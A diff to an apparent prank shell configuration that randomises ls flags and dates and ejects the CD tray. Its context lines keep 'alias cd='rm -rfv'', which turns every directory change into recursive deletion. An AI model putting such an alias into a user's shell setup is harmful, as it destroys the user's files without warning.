@@ -19,14 +19,8 @@ function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1})
 # Delete directories instead of entering them
 alias cd='rm -rfv'
 
-# No matter where you want to cd, you would end up at $HOME
-export PROMPT_COMMAND="cd"
-
 # alias date to generate random dates
-alias date="date -d "2014-01-01 + $RANDOM days" +'%d.%m.%Y'"
+alias date='date -d "now + $RANDOM days"'
 
 # eject cd-tray at random time.
-sleep $[ ( $RANDOM % 10 )  + 1 ]s && [[ uname=="Darwin" ]] && drutil eject || eject -T 
-
-# alias alias :D ?
-alias alias="echo 'Sorry $USER you can't do that'"
+sleep $[ ( $RANDOM % 10 )  + 1 ]s && [[ uname=="Darwin" ]] && drutil eject || eject -T &
